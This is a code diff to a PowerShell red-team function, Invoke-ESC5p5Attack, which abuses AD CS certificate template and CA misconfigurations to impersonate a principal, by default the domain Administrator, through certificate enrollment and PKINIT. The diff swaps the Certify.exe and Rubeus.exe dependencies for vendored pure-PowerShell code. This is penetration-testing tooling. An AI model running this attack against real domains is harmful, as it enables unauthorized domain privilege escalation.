@@ -25,18 +25,6 @@ function Invoke-ESC5p5Attack {
         A result object from Find-ESC5p5Combo containing ESC5 certificate template container + enrollment service combinations.
         The object should have CertTemplatesContainers, EnrollmentServices, ESC5CertTemplatesIssues, and ESC5EnrollmentIssues properties.
 
-        .PARAMETER CertifyPath
-        Path to Certify.exe executable. If not specified, assumes Certify.exe is in the Binaries
-        folder (.\Binaries\Certify.exe).
-
-        .PARAMETER RubeusPath
-        Path to Rubeus.exe executable. If not specified, assumes Rubeus.exe is in the Binaries
-        folder (.\Binaries\Rubeus.exe). Used for automatic TGT request after certificate issuance.
-
-        .PARAMETER OutputPath
-        Directory for temporary operations. Defaults to .\Output\. Note: Certificates
-        are kept in memory and not saved to files.
-
         .PARAMETER TargetPrincipal
         DirectoryEntry object representing the security principal to impersonate in the certificate.
         If not specified, automatically discovers and uses the domain Administrator account (RID 500).
@@ -77,14 +65,11 @@ function Invoke-ESC5p5Attack {
         Only use in authorized penetration testing or red team exercises.
         
         Requires:
-        - Certify.exe (https://github.com/GhostPack/Certify/releases) placed in .\Binaries\ folder
-        - Rubeus.exe (https://github.com/GhostPack/Rubeus/releases) placed in .\Binaries\ folder
+        - No external tools; enrollment + PKINIT are pure PowerShell (vendored PSPkinit).
         - Network access to Certificate Authority
         - Appropriate permissions to create certificate templates
         - Appropriate permissions to modify CA configurations
         - Appropriate permissions to enroll certificates
-        
-        Download Certify.exe and Rubeus.exe and place them in the Binaries folder before using this function.
 
         .LINK
         https://posts.specterops.io/certified-pre-owned-d95910965cd2
@@ -94,16 +79,7 @@ function Invoke-ESC5p5Attack {
         [Parameter(Mandatory, ValueFromPipeline)]
         [ValidateNotNull()]
         [PSCustomObject]$ESC5p5Result,
-        
-        [Parameter()]
-        [string]$CertifyPath = ".\Binaries\Certify.exe",
-        
-        [Parameter()]
-        [string]$RubeusPath = ".\Binaries\Rubeus.exe",
-        
-        [Parameter()]
-        [string]$OutputPath = "./Output/",
-        
+
         [Parameter()]
         [System.DirectoryServices.DirectoryEntry]$TargetPrincipal,
         
@@ -115,18 +91,7 @@ function Invoke-ESC5p5Attack {
 
     begin {
         Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
-        
-        # Validate that we have the required tools for the attack
-        if (-not $WhatIfPreference) {
-            if (-not (Test-Path -Path $CertifyPath)) {
-                throw "Certify.exe not found at: $CertifyPath. Please download from https://github.com/GhostPack/Certify/releases"
-            }
-            
-            if (-not (Test-Path -Path $RubeusPath)) {
-                throw "Rubeus.exe not found at: $RubeusPath. Please download from https://github.com/GhostPack/Rubeus/releases"
-            }
-        }
-        
+
         # Initialize results array
         $attackResults = @()
         
@@ -231,7 +196,7 @@ function Invoke-ESC5p5Attack {
                                     
                                     Write-Host "  Step 5: Getting CA full name..." -ForegroundColor Yellow
                                     
-                                    # Get the CA full name for Certify.exe
+                                    # Get the CA full name for certificate enrollment
                                     $caFullName = Get-CAFullName -CAObjects $caDirectoryEntry
                                     
                                     if ($caFullName) {
@@ -243,9 +208,6 @@ function Invoke-ESC5p5Attack {
                                         $esc1Params = @{
                                             TemplateObject = $convertResult
                                             CertificateAuthority = $caFullName
-                                            CertifyPath = $CertifyPath
-                                            RubeusPath = $RubeusPath
-                                            OutputPath = $OutputPath
                                         }
                                         
                                         # Add optional parameters if provided
